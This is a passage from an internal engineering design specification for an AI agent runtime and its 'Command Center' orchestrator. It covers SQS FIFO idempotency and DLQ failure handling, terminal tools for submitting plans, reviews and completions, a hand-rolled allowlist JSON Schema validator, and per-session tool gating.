  2. **Make the status write conditional.** Add a `ConditionExpression` to `writeStatus` (`index.js:104-127`) asserting the cycle is still in the status the transition expects to move it *out of*, and treat `ConditionalCheckFailedException` as "already applied, nothing to do". That is the pattern `processPlanGeneration` already uses (`index.js:1260`, `:1282`: `'attribute_exists(PK) AND #status <> :cancelled'`), it needs no change to `sdlcEngine.js`, and it makes replay safe by construction rather than by a table being complete.

  Phase 3 Task 3.4 implements it and tests it with a deliberate replay.

**FIFO facts that shape the numbers.** This is the repo's first FIFO queue — all existing `aws_sqs_queue` resources are standard.

- The queue name must end `.fifo`.
- **A poison message blocks its entire message group, and partial-batch reporting does not rescue it.** For a FIFO event source, `ReportBatchItemFailures` returns the failed message *and every later message in that group* — that is what preserving order means. It is still worth setting (it stops a batch spanning several sessions from re-delivering unrelated sessions' messages) but it does not let a session's events flow past a message it cannot process. The group stays blocked until `maxReceiveCount` is exhausted and the message moves to the DLQ.
- **The number to choose is therefore how long a cycle may freeze.** At `maxReceiveCount = 3` and `visibility_timeout_seconds = 180`, that is roughly **9 minutes** of frozen cycle before the DLQ releases the group, against a 20-minute stall threshold (`cycleStatuses.js:144`). It fits with margin. Shortening the visibility timeout shortens the freeze but risks re-delivering a message the consumer is still working on; **180 s against a 3-minute consumer timeout is the tightest pair that stays safe.** Changing either number without re-checking this budget is how this becomes a stall.
- FIFO throughput is 300 msg/s per queue (3 000 batched), far above anything 10 concurrent sessions produce under this coalescing.

#### A.4.6 Failure disposition: DLQ, or terminal cycle status

**Normative, and the one distinction an implementer is most likely to collapse.** Two kinds of thing go wrong in the consumer, and they want opposite handling. Getting it backwards is expensive in both directions: a DLQ for a model failure freezes a session's message group for nine minutes to re-derive an answer it already had, and a terminal status for a protocol failure throws away events that a redrive would have replayed correctly.

**The test is one question: would a redrive after a code deploy succeed?**

| Disposition | When | Mechanism | Cost if you get it wrong |
|---|---|---|---|
| **Batch item failure → DLQ + alarm** | Yes — the message is fine and the consumer is not ready for it, or the failure is transient | report `itemIdentifier`; SQS retries ×3 then DLQs; the alarm pages | — |
| **Terminal cycle status, message consumed** | No — the failure is deterministic and re-reading the same bytes produces the same answer; a human must act | write `PLANNING_FAILED` / `QA_FAILED` / `ENGINEERING_FAILED`, return normally | — |

Applied to every failure this consumer can see:

| Failure | Disposition | Why |
|---|---|---|
| Unparseable message body | DLQ | not a cycle's fault; the message is diagnostic evidence |
| Unknown envelope `v` | DLQ | **the two repos have drifted.** A redrive after the consumer is upgraded replays it correctly — that is the whole reason `v` exists (§A.4.1) |
| `events: []` | DLQ | a publisher bug; the DLQ message is the bug report |
| **Unrecognised `completion.kind`** | **DLQ** | **a genuine protocol violation** — a tool produced a payload kind the consumer has never heard of. A redrive after the consumer learns it succeeds |
| **`kind` inconsistent with `correlation.stage`** | **DLQ** | CC granted the wrong tool. A configuration bug, fixable and replayable |
| `stage` the consumer does not know (`validateEnvelope`) | DLQ | same class: a new stage is a CC deploy, and the events are worth replaying afterwards |
| Effect kind `applyRuntimeEffect` cannot handle | DLQ | the mapper is ahead of the executor — exactly the Phase 3 / Phase 5 gap. Replayable once the arm lands |
| Transient DynamoDB or runtime error (throughput, `5xx`, timeout) | DLQ | retry is the correct response, which is what SQS already does |
| **Malformed `submitPlan`/`submitReview` payload** (fails `validateCompletionPayload`) | **Terminal cycle status** | **the model produced bad output.** Deterministic: three retries read the same bytes and fail the same way, so the DLQ path spends ~9 minutes of a frozen `messageGroupId` (§A.4.5's budget) to arrive where the first attempt already was — and it freezes every *later* event for that session too. Write `PLANNING_FAILED` / `QA_FAILED` **naming the offending field**, consume the message, and let a human retry the step. Both are `ATTENTION_STATUSES` and surface in the attention card |
| Cycle record missing | consume, log | not retryable and not a cycle failure — the cycle is gone. A retry would freeze the group for nine minutes per event, repeatedly, for every event that session emits |
| Cycle cancelled | consume, log | the events have no destination |

**Why the malformed-payload row moved.** An earlier revision of this document made the effect vocabulary fail-closed (§0.5 finding 4) and, in doing so, swept malformed payloads into the throwing path. That was right when the plan and review payloads were schema-enforced by the tool-use API — a malformed one then really was a protocol violation. **Once the plan and review payloads became opaque, the model became the only thing that could produce a bad one, and a model failure is an ordinary cycle outcome.** Revision 3 sharpens this rather than changing it: with `resultSchema` (§A.5.3) the *common* malformed payload is now caught in-session and never reaches the consumer at all, so this row fires rarely instead of routinely — but when it does fire, the disposition is unchanged. Part 2 raised this and its reasoning is better than mine; the fail-closed default arm stays for everything that is genuinely a contract breach.

**The consequence for the code:** `validateCompletionPayload` failing must **not** propagate out of `processRecord`. Catch it, write the status, return. Everything else is allowed to throw, and `applyRuntimeEffect`'s `default` arm does (Task 3.3 PR (b)).

### A.5 The three terminal tools

Each role finishes by calling exactly one tool, and that tool produces the `completion` payload (§A.4.3). **None of the three exists today.**

#### A.5.0 Why the plan and QA schemas are not in the runtime — the real reason

**Lead with this, not with the boundary.** Two earlier revisions of this document argued the case from architecture doc §1.1 ("the runtime never learns an SDLC concept"). That framing is weaker than it looks and it predicts the wrong things:

- **The runtime already knows what a plan is, as a first-class generic concept.** `SessionCommand = 'do' | 'plan'` (`session.ts:2`); `writePlan` writes `context/plans/<slug>.md` (`workspace-tools.ts:213`); `PLAN_BLOCKED_TOOLS` gates plan mode (`tool-specs.ts:522`); `planCreated` is a protocol `ServerMessage` (`messages.ts:22`); `AgentSession.plan?: SessionPlanRef` is in the protocol (`session.ts:94`). **A tool named `submitPlan` is not a boundary violation on the "plan" axis at all.**
- **`instructions` crosses the same boundary carrying far more SDLC content**, and nobody calls it a breach: a CC-authored system prompt with the role's output contract, per-app conventions, RAG context and the plan schema in prose, stored on the session and fed to a model. That is fine **because the runtime does not read or branch on it** — which is the correct reading of §1.1, and the reading under which a generically-executed JSON Schema is equally compliant.
- The earlier revision conceded the point one layer down anyway: *"the cost was operational, not aesthetic."*

**So the real reason, stated once, here:**

> Command Center's plan and QA schemas do not live in the runtime because **the runtime has no deploy pipeline, no staging instance, no session drain, no version Command Center can observe, and a demonstrated history of schema/handler drift with no test that catches it.** Not because the word "plan" offends a boundary rule.

That framing is falsifiable and it correctly predicts what changes if the deploy story improves. Each clause is verified:

1. **No deploy pipeline.** No workflow deploys the runtime. `publish-sherpa.yml` builds a tarball to S3 and overwrites `runtime/latest.txt`; the deploy is a documented manual `aws ssm send-command` that runs `systemctl stop sherpa-runtime` then `rm -rf /opt/sherpa/*` (`nevado-sherpa-tui/docs/AWS_DEPLOYMENT.md:578-607`).
2. **No drain.** The doc states the consequence plainly at `:555` — *"anything in flight is lost"* — with an advisory-only human `/health` pre-flight. The process could not drain if asked: `SIGTERM` does `ptyManager.killAll()` then `app.close()` (`apps/runtime/src/index.ts:131-137`), and agent turns are fire-and-forget off the HTTP lifecycle (`routes/sessions.ts:343`, `:366`), so `app.close()` does not await them. The systemd unit has no `TimeoutStopSec`, `ExecStop` or `KillMode` tuning.
3. **No observable version.** The instance resolves its artifact from a **mutable pointer**, `runtime/latest.txt` → `runtime/sha-<sha>.tar.gz` (`sherpa-ec2-cloud-init.sh.tftpl:116-125`). `backend/__tests__/sherpaSdkDriftGuard.test.js`'s own header says the runtime's version *"cannot be pinned or even observed from this repo."* **A validation guarantee you cannot version is not a guarantee** — the consumer must revalidate regardless, so a runtime-resident schema is duplicated work, not avoided work.
4. **Demonstrated drift, and this is the fact that settles it.** See §A.5.0a.

##### A.5.0a `inputSchema` is never read at runtime, and the hand-rolled alternative has already drifted twice

**The decisive fact, which the architecture doc and two revisions of this spec all missed.** Verified against the deployed `@nevadoai/sherpa-core@4.0.1`:

- **`inputSchema` is assembled into Bedrock's `ToolConfiguration` (`bedrock-client.ts:163`) and never consulted again.** Within the SDK source, `inputSchema` appears **only in `tool-specs.ts`** — there is no other reader.
- **There is no schema validator in either repo.** `grep -IE "ajv|\bzod\b|json-schema|jsonschema"` across `sherpa-sdk/packages`, `nevado-sherpa-tui/apps` and both `package.json` trees returns **zero hits.** `additionalProperties` appears **zero times** in `tool-specs.ts`.
- Every argument check is **hand-rolled, imperative, per field**, inside the dispatch switch: `if (!filePath || typeof filePath !== 'string') return toolError(...)`.

**So a declared `inputSchema` buys generation-time biasing from Bedrock and the model reading the `description`. It buys zero enforcement.** The architecture doc's claim that the runtime "validates the payload against that schema at the tool-call boundary" is false against the deployed code.

**And the arrangement that would have to replace it is already broken in production, in two shipped tools, with no test noticing:**

- **`saveLearnedPattern` is non-functional in shipped code — it fails on every call.** It declares `{title, category, trigger, content}` with `required: ['title','category','content']` (`tool-specs.ts:428-451`). The handler hard-requires **`input.pattern`** (`agent-engine.ts:1237-1239`) — and **`pattern` is declared zero times in that spec block**, so a model has no way to know to send it. Meanwhile `content` is declared **required** and **never read**, and `trigger` is declared and never read. The handler also reads `input.context`, likewise undeclared.

  So a model obeying the declared schema exactly supplies `title`, `category` and `content`, sends no `pattern`, and receives `toolError('Missing or invalid "pattern" parameter (string required).')`. **There is no compliant input that succeeds.** Verified by enumerating every `input.*` the handler reads (`title`, `pattern`, `category`, `context`) against every declared property (`title`, `category`, `trigger`, `content`): the intersection is `{title, category}`, and the one field the handler cannot proceed without is in neither set.

  This is stronger than drift and worth stating precisely: **it is not that the schema and handler disagree at the margins, it is that the tool cannot be called successfully at all**, and it has shipped in that state through at least two releases (identical at `v4.0.1` and HEAD) with no test noticing.
- **`updateTechDebt` declares `{priority, category, location}`** (`:460-492`); the handler reads `input.severity`, `input.file`, `input.line` (`:1290-1296`), so `severity` silently always defaults.
- Both drifts were **identical at HEAD** when this was written. `tool-specs.test.ts` tests only name filtering. **There is no spec↔handler conformance test anywhere.**

**Revision 6 — the evidence is unchanged where it counts, and one half has since been fixed upstream.** `sherpa-sdk` #223 ("saveLearnedPattern reads the content/trigger fields its tool spec declares") repaired the first drift on `main`. **Three things that does NOT change:**

1. **The deployed runtime pins `4.0.1`, which predates the fix**, so both drifts are live in the code this design runs against. The argument below is about observed behaviour, not history.
2. **The argument was never "these two tools are broken".** It was *"an arrangement in which a declared schema and a handler can silently disagree produced two such tools, in shipped code, through at least two releases, with no test noticing."* **A fix to one instance is not a fix to the arrangement** — and the absence of a conformance test, which is what let both ship, is unchanged.
3. **§A.5.3's design is what removes the failure class**, and it does so by construction rather than by vigilance: the schema *is* the validator's runtime input, shipped from Command Center with every session create, so there is no parallel artifact to fall out of sync with. That is why the fix landing upstream does not reopen the question of putting CC's schemas in the runtime.

Putting the plan schema — the artifact a human approves at a gate — and the QA schema — the artifact that decides whether unreviewed code merges — into *that* arrangement is not a hypothetical risk. It is the observed behaviour of the two most recently added tools.

**§A.5.3's design removes the possibility of drift by construction: the schema *is* the validator's runtime input, shipped from Command Center with every session create. There is no parallel artifact to fall out of sync with.**

**One related hazard worth knowing, because it changes what a handler must check.** Unparseable tool JSON is **silently laundered into a plausible-looking argument object**: `bedrock-client.ts:277-292` is `try { input = JSON.parse(toolInputJson) } catch { input = { raw: toolInputJson } }`. A truncated tool call therefore reaches the handler as `{raw: "<partial string>"}` *as if it were real arguments*. Under a fully-typed `submitPlan` with no handler validation that flows straight through as an empty plan. Under §A.5.2's shape checks it trips the "success with no payload" rule. **Every handler must treat a missing expected key as a real possibility, not an impossible one.**

#### A.5.1 `reportCompletion` — engineering, and fully typed

```ts
{
  name: 'reportCompletion',
  description: 'Finish the task: stage all changes, commit, push the branch, and report the result.',
  inputSchema: { json: { type: 'object', properties: {
    summary:       { type: 'string', description: 'One-paragraph description of what changed and why.' },
    commitMessage: { type: 'string', description: 'One-line commit subject.' },
    outcome:       { type: 'string', enum: ['success', 'blocked'] },
    blockedReason: { type: 'string', description: 'Required when outcome is "blocked".' },
    verification:  { type: 'string', description: 'What was run to verify (tests, build) and the result.' }
  }, required: ['summary', 'commitMessage', 'outcome'] } }
}
```

**This one stays typed, and the reasons do not extend to the other two:**

- **Its fields drive behaviour inside the tool.** `commitMessage` becomes a commit subject; `outcome` decides whether to push at all. A schema the model is *told* about is the right shape for arguments with side effects, and `payload: unknown` would mean parsing a commit message out of an opaque blob.
- **Its schema is generic session vocabulary.** `summary`, `commitMessage`, `outcome`, `blockedReason`, `verification` — nothing in it is a Command Center concept. It is the one tool where a typed contract costs nothing at the boundary and **will not need to change when CC's plan or QA vocabulary does.**
- **Its justification for being a tool at all is the working tree**, which only the session has. That argument genuinely does not extend to a plan or a review, which touch no files.

**⚠ Revision 6: it does NOT commit or push. It VERIFIES.** The description above — *"stage all changes, commit, push the branch"* — is struck. What the tool does is **inspect the repository and refuse a `'success'` outcome while anything is uncommitted or unpushed**, naming what is outstanding. The agent stages, commits and pushes **itself**, with `runCommand`, before calling the tool; the description tells it so explicitly, with the commands.

**This is forced, not preferred.** The tool reaches the engine through `useMcpTool`, and `TOOL_METADATA.useMcpTool` is `{timeoutMs: 30_000, timeoutExempt: false}` — keyed on the **dispatcher** name, so it cannot be raised for one proxied tool. The engine's `withTimeout` resolves a `toolError` at the deadline **without cancelling the work.** A stage-commit-push-with-retry inside 30 seconds therefore has a live failure mode on any slow remote: **the agent is told the completion failed while the push succeeds behind it** — a cycle marked broken over work that landed. Verifying is bounded, idempotent and safe to retry.

**`commitMessage` survives in the schema as the subject the agent reports having used**, not as an instruction to the tool. Nothing in the tool creates a commit, so nothing consumes it as a message.

**The enforcement caveat from §A.5.0a applies, and harder than it did:** not only is the declared schema unenforced, **the model never sees it at all** (`listMcpTools` renders only name and description). So the handler must hand-check every field it uses, and the **description is the only machine-readable statement of the calling convention.** ~~A test must bind the declared spec to the handler.~~ Struck — there is no declared-schema/handler pair to bind; see Task 2.1.

Behaviour, normative:

| Case | Behaviour |
|---|---|
| Arguments arrive as `{raw: "…"}` with no `outcome` | `toolError` saying the call could not be parsed and to resend it more compactly. This is the laundered-JSON case (§A.5.0a) and it **must not** be mistaken for a blocked outcome. Checked **first** |
| `outcome` absent or not in `{success, blocked}` | `toolError` |
| `summary` absent or empty | `toolError`. **Required on BOTH arms** — a blocked result the cycle cannot explain to a human is nearly as useless as no result |
| `outcome: 'blocked'` with no `blockedReason` | `toolError` |
| `outcome: 'blocked'` | Nothing is committed or pushed, **but where the work got to is still recorded** so the cycle can show it: `pushed: false`, `branch`/`commitSha` from current HEAD, `filesModified` populated, `blockedReason` echoed |
| The repository cannot be inspected | `toolError` carrying **git's own message**. Load-bearing: `"not a git repository"` and `"unknown revision"` call for very different fixes. **Never report a completion that cannot be substantiated** |
| `outcome: 'success'` with uncommitted changes | **`toolError` naming what is outstanding**, so the agent can commit and call again |
| `outcome: 'success'` with unpushed commits | **`toolError` naming the unpushed state.** Same shape, different remedy |
| `outcome: 'success'`, empty tree | **`toolError`** telling the agent nothing changed, so it can correct itself rather than the cycle discovering it later |
| Success | `pushed: true`, `commitSha` and `branch` read from the repository, `filesModified` = the session's list **unioned with git's changed-file list, sorted and deduplicated**. The returned content **is** the recorded result, so the agent sees what was kept |

**`usage` is absent from the result**, and this is a deliberate loss rather than an omission. Cumulative `TokenUsage` lives in **private fields on `AgentEngine`** and is unreachable from the seam, so the runtime cannot supply it. The consumer's `CompletionPayload.usage` stays **optional** and is simply not populated on this path. §A.4.3's rule about *which* keys it may carry still stands for whoever populates it later.

**So what is genuinely new code here is `git-state.ts`, and it is read-only.** The earlier revision's finding stands — `sherpa-sdk/packages/core` has **no commit or push primitive at all**, verified by an exhaustive git-subcommand census: `rev-parse`×12, `worktree`×6, `status`×6, `fetch`×3, `write-tree`×2, `stash`×2, `reset`×2, `remote`×2, `add`×2, plus single uses of `symbolic-ref`, `merge`, `ls-remote`, `log`, `commit-tree`, `cat-file`, `branch`; **no porcelain `git commit`** (the only commit-creating code is plumbing `commit-tree` in `git-isolate.ts:228-244`, building dangling commits that advance no branch) and **no `git push`** (the only `'push'` string is `git stash push -u -m` at `resume-guard.ts:717`). **That census is now a reason the verify design is right rather than a list of things to build:** the primitives the agent needs are `git` itself, which it already reaches through `runCommand`, and nothing has to be reimplemented inside a 30-second budget.

#### A.5.2 `submitPlan` and `submitReview` — named tools, opaque payloads

Two separate tools, identical in shape, differing only in name and therefore in the `kind` they produce (§A.4.3).

```ts
// Both tools, identical inputSchema. Only `name` and `description` differ.
{
  name: 'submitPlan',   // and: 'submitReview'
  description: 'Submit your finished plan. The required shape of `payload` is specified in your instructions.',
  inputSchema: { json: { type: 'object', properties: {
    outcome:       { type: 'string', enum: ['success', 'blocked'] },
    summary:       { type: 'string', description: 'One-paragraph, human-readable summary of the result.' },
    blockedReason: { type: 'string', description: 'Required when outcome is "blocked".' },
    payload:       { type: 'object', description: 'The structured result, in the shape your instructions specify.' }
  }, required: ['outcome', 'summary'] } }
}
```

**`payload` is declared `type: 'object'`, and the handler enforces object-only — not object-or-array.** An earlier revision's prose said "object or array (not a bare scalar)" while the declared schema said `object`; that was an internal contradiction. **Object-only is the resolution**, for two reasons: it matches the declaration, so the model is told the same thing the handler enforces; and both real payloads *are* objects (the plan is `{summary, requirements[], …}`, the review is `{verdict, findings[], …}`), so allowing a top-level array buys nothing and makes the consumer's schema dispatch ambiguous. **A top-level array is a `toolError`.**

**A property-less `object` parameter is already shipped and accepted by Bedrock** — `useMcpTool.input` is exactly this pattern (`tool-specs.ts:409-412`: `{type: 'object', description: 'Tool input parameters (varies by tool — check listMcpTools for schema)'}`). §A.5.3 is that pattern with "described elsewhere" made machine-readable.

Behaviour, normative. Checks run **in this order**, so the cheapest and most diagnostic failures come first:

| # | Case | Behaviour |
|---|---|---|
| 1 | arguments arrive as `{raw: "…"}` (laundered unparseable JSON, §A.5.0a) | `toolError` saying the tool call could not be parsed |
| 2 | `outcome` absent or not in `{success, blocked}` | `toolError` |
| 3 | `outcome: 'blocked'` with no `blockedReason` | `toolError` |
| 4 | `outcome: 'success'` with no `payload` | `toolError` — a success with nothing in it is a failed instruction |
| 5 | `payload` not a plain object (array, scalar, null) | `toolError` naming what was received |
| 6 | `payload` not JSON-serialisable | `toolError` |
| 7 | `payload` over **256 KB** serialised | `toolError` **naming the size and the limit** (§A.4.3's oversize gate) |
| 8 | **`resultSchema` present and `payload` fails it** | **`toolError` listing the failing paths** — §A.5.3. This is the in-session enforcement, and it is the whole point |
| 9 | the terminal tool has already fired this session | `toolError('result already submitted')` — §A.5.4a |
| 10 | otherwise | produces a `PlanResult` / `ReviewResult`; the returned `ToolResult` content is the payload |

**No commit, no push.** Neither a plan nor a review touches the working tree.

**Where the schema lives, and this is the point of the whole design:**

| Artifact | Home | Deploy path |
|---|---|---|
| The schema, as data — one literal per stage | `backend/common/sdlcContract.js`, exporting `PLAN_PAYLOAD_SCHEMA` and `QA_PAYLOAD_SCHEMA` | CC pipeline — **minutes** |
| What the agent is told to produce | **the same object**, serialised into `instructions` (§A.6) | same object, so prose cannot drift from the validator |
| In-session enforcement | the runtime's **generic** validator, driven by `resultSchema` from create | the schema changes with CC; the validator never changes |
| Authoritative acceptance | `validateCompletionPayload(stage, payload)` in the consumer, running the **same** schema plus the rules JSON Schema cannot state | CC pipeline — **minutes** |
| The tool's own `inputSchema` | `tool-specs.ts` | SDK publish + manual SSM deploy — **and it never needs to change again** |

**One JSON object in Command Center is simultaneously the prompt contract, the in-session gate, and the consumer's validator.** That is the property worth having, and it is what neither revision 1 (three copies, no test binding them) nor revision 2 (prose and validator, no in-session gate) achieved.

#### A.5.3 `resultSchema` — a caller-supplied schema, executed generically

**New optional create-time field.** This is what returns in-session enforcement without any Command Center vocabulary entering the runtime.

```ts
// CreateSessionRequest
readonly resultSchema?: unknown;   // OPTIONAL. An opaque JSON Schema authored by CC.
```

Stored on the session record **beside `correlation` and `instructions`**, in the same class of field: CC-authored, runtime-uninterpreted, echoed or executed but never read for meaning.

| Aspect | Specification |
|---|---|
| **Optionality** | **Optional, and absent means forward unvalidated** (checks 1–7 and 9 of §A.5.2 still run). This is load-bearing — see below. |
| **Bounds at create** | ≤ **32 KB** serialised, nesting depth ≤ **8**, ≤ **300** nodes. Mirrors §A.2.1's courier bounds on `correlation`. |
| **A malformed schema** | **`400` at create.** It is a Command Center bug and must be loud immediately, not at the end of a session. Do **not** silently fall back to unvalidated. |
| **Keywords — a CLOSED allowlist** | Exactly these nine, and **nothing else**: `type`, `properties`, `required`, `items`, `enum`, `maxLength`, `maxItems`, `minItems`, `additionalProperties` (accepted only as `false`). **Any other keyword — standard JSON Schema or not — is a `400` at create.** See the rule below; this is not a stylistic preference. |
| **Why some notable keywords are absent** | Annotations on the allowlist above, **not a second list to check against.** `$ref`: no resolution, so no cycles to bound. `allOf`/`anyOf`/`oneOf`: combinatorial, and their error messages are unusable for an agent trying to correct itself. **`pattern`: a caller-supplied regex executed on an unattended, long-lived, multi-tenant process is a ReDoS vector** for no benefit here. `format`, `minLength`, `minimum`, `maximum`, `uniqueItems`, `const`, `not`, `dependentRequired`: simply not implemented, and therefore rejected. |
| **On failure** | `toolError` listing failing **JSON Pointer** paths with expected types, length-capped (cap the message, or a 300-finding payload produces an unreadable error the model cannot act on). |
| **Implementation** | ~120 lines plus a test file, in `packages/core`. **Hand-rolled, no new dependency.** |

##### The unrecognised-keyword rule — the same defect this redesign exists to prevent

**Normative: the validator MUST reject a schema containing any keyword outside the allowlist. It MUST NOT ignore it.**

An earlier draft called the subset "bounded" and listed exclusions, which invites the natural implementation — walk the schema, handle the keywords you know, skip the rest. **That implementation reproduces exactly the failure that motivated this entire redesign.** Consider Command Center authoring:

```jsonc
{ "type": "object",
  "properties": { "verdict":  { "type": "string", "enum": ["pass", "fail"] },
                  "findings": { "type": "array", "minItems": 1 } },
  "required": ["verdict", "findings"] }
```

`minItems` is in the allowlist, so it is enforced. Swap it for `minLength`, `uniqueItems` or `format` and — under skip-the-rest — **CC has authored a constraint, believes it is enforced in-session, and every payload sails through.** The schema says one thing, the code honours another, and nothing reports the gap. That is `saveLearnedPattern` (§A.5.0a) rebuilt inside the very mechanism designed to make it impossible.

**Rejecting costs nothing, because `resultSchema` is already validated at create time.** The failure lands as the `400` this section already defines, at the moment CC sends the schema — not never. CC learns at session-create that it used a keyword the runtime cannot enforce, which is the only moment the information is actionable.

**Write the subset as a closed allowlist in the code, not as a set of exclusions.** The difference is the failure mode when JSON Schema gains a keyword, or when CC reaches for `minLength` next quarter:

| Framing | Adding a keyword later fails as |
|---|---|
| Allowlist (**required**) | a rejected create — loud, immediate, at the author |
| Denylist / skip-the-rest | a silent pass — the constraint is decorative and nobody finds out |

**Implementation note.** The check is one line per schema node — `for (const k of Object.keys(node)) if (!ALLOWED.has(k)) reject(path, k)` — applied during the same recursive descent that bounds depth and node count. Report the **JSON Pointer path and the offending keyword name**, so a 300-node schema with one bad keyword tells CC where it is. **Also reject `additionalProperties: true` explicitly** rather than accepting the key and ignoring its value — that would be the same defect in miniature.

**One deliberate consequence:** widening the subset later is a runtime deploy, i.e. an outage window (§A.5.0). That is the correct price. A CC-side schema change needing a *new keyword* is rare; a change within the existing nine is the common case and stays free. And if nine turn out to be too few, the evidence is a specific rejected create naming the keyword — a far better prompt for that conversation than discovering a year of unenforced constraints.


**On the dependency question, and this is a real decision, not a default.** Neither `sherpa-sdk` nor `nevado-sherpa-tui` has *any* schema-validation dependency today (verified: zero hits for `ajv|zod|json-schema|jsonschema` across both `packages`/`apps` trees and all four `package.json` files). `packages/core`'s only non-AWS runtime dependency is `glob`. So:

> **Do not add `ajv`.** It is the obvious reach and it is the wrong one here: `ajv` compiles schemas to JavaScript at runtime, and doing that on **caller-supplied input** inside a **long-lived multi-tenant process** is a materially worse trade than 120 lines of readable recursive descent over a bounded keyword set. A hand-rolled subset is also the house style — every other validation in this codebase is hand-rolled — so it is not a deviation.

If the team disagrees and wants a library, **`ajv` with `code: {optimize: false}` and no `$ref`**, or a non-compiling validator, are the options to weigh — but weigh them explicitly rather than reaching for the default.

**Why optionality is load-bearing, not a convenience.** Two properties follow from `resultSchema` being absent-tolerant:

1. **The seam can ship before it is used.** The runtime deploy carries the validator; Command Center turns it on later by starting to send `resultSchema`. No coordination, and — since revision 6 — no release either.
2. **If the validator itself is wrong, Command Center disables it by stopping sending `resultSchema` — with no runtime deploy.** That is the answer to *"what if the 120 lines have a bug?"*, and it is precisely why a **generic** validator is safe to put behind an outage-gated release in a way a plan-specific one would not be. A bug in a hand-written plan validator inside `agent-engine.ts` would need an outage window to fix.

**It rides the one RUNTIME deploy, so its marginal cost is zero deploy windows.** Task 2.1 already takes that deploy for the three terminal tools and the double-submit guard. ~~… and `PLAN_BLOCKED_TOOLS`, `TOOL_METADATA`, the `buildToolConfig` allowlist filter and the `SessionManager` unforcing (§A.8 P10–P12).~~ **Struck in revision 6**: none of those four exist — the tools live behind `McpToolProvider`, the allowlist filter is not expressible and the unforcing was declined (§A.5.4, §A.8, Task 2.0). **Deferring `resultSchema` to "later if malformed payloads prove common" costs one outage window; including it now costs none.** When the release mechanism is the binding constraint, the seams go in on the release you are already taking.

**The consumer-side validator stays and is not redundant.** It catches three things the runtime cannot: a session created without a schema; cross-field rules JSON Schema cannot express (`verdict: 'fail'` requires non-empty `findings`; `technicalApproach` must be *rejected*, not merely unrequired); and the standing fact that **Command Center must never trust the wire.** §A.4.6's disposition rules are unchanged — `resultSchema` only makes the "terminal cycle status" row rare instead of routine.

#### A.5.4 Mode gating — **it cannot reach these tools at all**

**Revision 6 replaces this subsection. Every row of the old change table is struck, because none of it is expressible against the deployed 4.0.1 and none of it shipped.**

The mechanism itself is as described: `buildToolConfig(mode)` filters `getToolConfig({extended: true, mode})` by provider availability, then removes `PLAN_BLOCKED_TOOLS` in plan mode. `PLAN_BLOCKED_TOOLS` is a `Set` at `tool-specs.ts:522` — `new Set(['editFile', 'writeFile'])` — independently enforced inside `getToolConfig` at `:532`, and `buildToolConfig` is **purely subtractive**: `rawConfig.tools.filter(...)`, no concat anywhere, **and no allowlist parameter.**

**The three terminal tools are invisible to all of it.** They reach the engine through `useMcpTool`, so:

- **`PLAN_BLOCKED_TOOLS` cannot see them.** It filters the fixed spec list; `submitPlan` is not in that list, and the only name it could block is `useMcpTool` itself — which would take MCP away wholesale.
- **A plan session can therefore physically attempt `reportCompletion`.** Nothing in mode gating stops it.
- **The subtractive filter cannot add anything either**, so "add `reportCompletion` to the `do` set" is not an operation `buildToolConfig` has.

> **What stops a plan session committing is the provider's own name check.** `listTools()` advertises **exactly one** tool — the session's — and `executeTool` returns a `toolError` for every other name, naming both the rejected tool and the one that is available. **That is stricter than mode gating would have been**, because it is code rather than configuration, and it is per session rather than per mode.

**So there is no backstop, and do not build one.** The earlier text said *"the allowlist is the real control; mode gating is the backstop for it"* — the second clause is false and the first is now the whole story, with the enforcement point moved from configuration into the provider. Putting half the separation somewhere mode gating *can* see would mean blocking `useMcpTool`, which removes the seam the tools arrive through.

**One residual cost, recorded so it is not discovered:** all three tools share one approval identity (`useMcpTool`), so an approval UI could not tell them apart. Harmless for unattended sessions, which approve everything (§A.7.4) — and a reason not to expose this seam to an attended surface without thought.

#### A.5.4a The terminal tool is not terminal — make first-write-wins deliberate

**A defect in the mechanism, not in the schema, and it was in every prior revision.**

The engine's turn loop **does not end on a successful terminal tool call.** It appends the tool result and continues until the model emits `end_turn` (`agent-engine.ts:608-610`, `:613-740`). So **a model can call `submitPlan` twice with two different payloads**, and both publish: the second envelope gets a fresh `dedupId` (§A.4.1), so SQS delivers it, and the consumer's idempotency (Task 3.4's `ConditionExpression`) then **silently discards it** because the status has already moved.

First-write-wins is almost certainly what you want. **But right now it is an accident, not a decision** — nothing in the design states it, no test asserts it, and the discard is invisible.

**This matters more under §A.5.3, not less.** A `toolError` from schema validation makes multiple terminal-tool calls per session *normal* — that is the retry loop working as intended. The distinction between "retried after a rejection" (expected, exactly one publish) and "submitted twice successfully" (a bug, two publishes) must be explicit.

**Decision: reject the second call in-session.** The handler records that a terminal tool has fired for this session and returns `toolError('result already submitted for this session')` on any subsequent call. Three benefits:

1. Only one envelope is ever published, so first-write-wins stops depending on a `ConditionExpression` that was written for a different purpose (replay, §A.4.5).
2. It stops the agent wandering after it is done — a real cost on a 120-turn budget.
3. The failure is visible to the model, which is where it can be acted on.

**Where the flag lives.** In-memory per session is sufficient and correct: a session that restarts has lost its turn loop anyway, and the consumer's idempotency still covers the cross-restart case. **Do not persist it** — that would put a `sessions.json` rewrite on the tool-call path, the same mistake BQ2 rejected for `seq`.

**Also assert the consumer half**, because the in-session guard cannot cover a duplicate that arrives from a redrive: Task 3.5's `it('does not double-apply a replayed terminal message')` already tests it. The two together are belt and braces; neither alone is sufficient.

### A.6 Instruction injection and message authorship

**Create-time `instructions` is the full system prompt.** CC composes it from what it already has:

```
new AgentBootstrap(KB_BUCKET, role).assemble()   // backend/common/agentBootstrap.js (137 lines)
                                                 //   AGENTS.md -> SOUL.md -> TOOLS.md -> memory -> skills
+ loadEngineeringDocumentation()                 // engineeringAgent/orchestratorHandler.js:1149
+ retrieveRelevantContext(task, applicationId)   // backend/common/knowledgeBaseLoader.js (593 lines), RAG
+ per-app context (stack, conventions, deploy target)
+ the role's output contract ("call reportCompletion when done")
```

The runtime appends **only** its own tool documentation. When `instructions` is present it does not call `loadSystemPrompt` (`prompt-loader.ts:79`), does not read `KB_BUCKET`, does not know `KB_PREFIX`.

This also sidesteps a real defect: `prompt-loader.ts:12` holds a **single** module-level cache entry keyed `kbBucket/kbPrefix` (with a 5-minute TTL at `:4`), which thrashes the moment two roles with different prefixes run concurrently on one runtime.

Note in passing, and it is convenient: `scripts/sync-knowledge-base.sh:7` targets `command-center-engineering-kb-dev`, **not** the `sherpa_kb` bucket. CC's KB and the runtime's KB are already separate buckets — one less thing to disentangle.

**Every subsequent message is also CC-authored.** Four kinds:

| Trigger | Message CC sends | Built from |
|---|---|---|
